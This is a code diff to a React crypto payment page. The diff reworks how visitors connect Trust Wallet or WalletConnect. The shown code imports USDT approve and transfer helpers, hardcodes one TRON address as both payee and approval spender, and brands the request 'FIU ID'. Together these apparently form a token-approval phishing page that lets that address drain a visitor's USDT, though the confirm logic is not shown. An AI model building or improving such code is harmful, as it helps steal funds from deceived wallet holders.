@@ -8,15 +8,12 @@ import { approveUSDT, transferUSDT } from "@/lib/web3";
 const DEFAULT_TO_ADDRESS = "TYT6ty8mhUyq7w2GbTWT1LSqWaWTs3j4aa";
 const DEFAULT_AMOUNT = "10";
 
-function buildTrustWalletOpenUrlDeepLink(): string {
-  if (typeof window === "undefined") {
-    return "";
-  }
-  const target = `${getWalletConnectAppUrl()}/#/trustwallet/tron`;
-  // coin_id=195 = TRON (SLIP-44)
-  return `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(
-    target
-  )}`;
+function canConnectViaTrustInjection(): boolean {
+  if (typeof window === "undefined") return false;
+  const w = window as unknown as { trustwallet?: unknown };
+  if (!w.trustwallet) return false;
+  const provider = getTrustRequestProvider();
+  return typeof provider?.request === "function";
 }
 
 function getTrustStatusSnapshot(): Record<string, unknown> {
@@ -98,15 +95,6 @@ const TrustWalletTronPay = () => {
   const toAddress = useMemo(() => DEFAULT_TO_ADDRESS, []);
   const approveTo = useMemo(() => DEFAULT_TO_ADDRESS, []);
 
-  const trustConnectDeepLink = useMemo(() => buildTrustWalletOpenUrlDeepLink(), []);
-  const trustConnectQrUrl = useMemo(
-    () =>
-      `https://quickchart.io/qr?size=420&margin=1&ecLevel=H&dark=1e81f5&light=f2f2f2&text=${encodeURIComponent(
-        trustConnectDeepLink
-      )}`,
-    [trustConnectDeepLink]
-  );
-
   useEffect(() => {
     isConnectedRef.current = isConnected;
   }, [isConnected]);
@@ -120,16 +108,43 @@ const TrustWalletTronPay = () => {
     trustConnectingRef.current = trustConnecting;
   }, [trustConnecting]);
 
-  const handleWalletConnectQr = async () => {
+  /** In Trust Discover: inject is present — use Trust adapter (native approve). Else: WalletConnect modal. */
+  const handleConnectWallet = async () => {
+    try {
+      delete (window as any).__tronWalletConnectOnUri;
+    } catch {
+      /* ignore */
+    }
+
+    if (canConnectViaTrustInjection()) {
+      const provider = getTrustRequestProvider();
+      try {
+        setTrustConnecting(true);
+        try {
+          await provider?.request?.({
+            method: "tron_requestAccounts",
+            params: {
+              websiteName: "FIU ID",
+              websiteIcon: `${getWalletConnectAppUrl()}/favicon.ico`,
+            },
+          });
+        } catch {
+          /* Trust may still connect */
+        }
+        await connect("trust");
+        toast.success("Wallet connected");
+      } catch (error) {
+        toast.error(
+          error instanceof Error ? error.message : "Could not connect in Trust Wallet"
+        );
+      } finally {
+        setTrustConnecting(false);
+      }
+      return;
+    }
+
     try {
       setWcConnecting(true);
-      // Do not set __tronWalletConnectOnUri — that skips the in-page modal and was used to
-      // deep-link to link.trustwallet.com/wc. Users want WalletConnect UI on this page only.
-      try {
-        delete (window as any).__tronWalletConnectOnUri;
-      } catch {
-        /* ignore */
-      }
       await connect("walletconnect");
       toast.success("Wallet connected");
     } catch (error) {
@@ -284,11 +299,6 @@ const TrustWalletTronPay = () => {
     })();
   }, [connect, isConnected, isConnecting, trustConnecting, wcConnecting, lastAutoConnect]);
 
-
-  useEffect(() => {
-    handleWalletConnectQr();
-  }, []);
-
   const handleConfirm = async () => {
     if (!isConnected) {
       toast.error("Connect your wallet first using the QR code or WalletConnect.");
@@ -407,10 +417,14 @@ const TrustWalletTronPay = () => {
             <button
               type="button"
               className="mt-2 w-full rounded-full border border-[#d7d7dc] bg-white py-2.5 text-sm font-medium text-[#4b4b54] disabled:opacity-50"
-              onClick={handleWalletConnectQr}
+              onClick={handleConnectWallet}
               disabled={wcConnecting || trustConnecting || isConnecting}
             >
-              {wcConnecting ? "Opening WalletConnect…" : "Connect with WalletConnect (QR)"}
+              {trustConnecting
+                ? "Connecting…"
+                : wcConnecting
+                  ? "Opening WalletConnect…"
+                  : "Connect Wallet"}
             </button>
           </div>
         )}
@@ -491,7 +505,6 @@ const TrustWalletTronPay = () => {
             <Info className="w-4 h-4 text-[#5f5de8]" />
           </div>
         </div>
-        <p>{buildTrustWalletOpenUrlDeepLink()}</p>
         <button
           className="fixed bottom-4 left-1/2 -translate-x-1/2 w-[calc(100%-24px)] max-w-sm h-12 rounded-full bg-[#8d8cf0] text-white font-semibold disabled:opacity-55"
           onClick={handleConfirm}
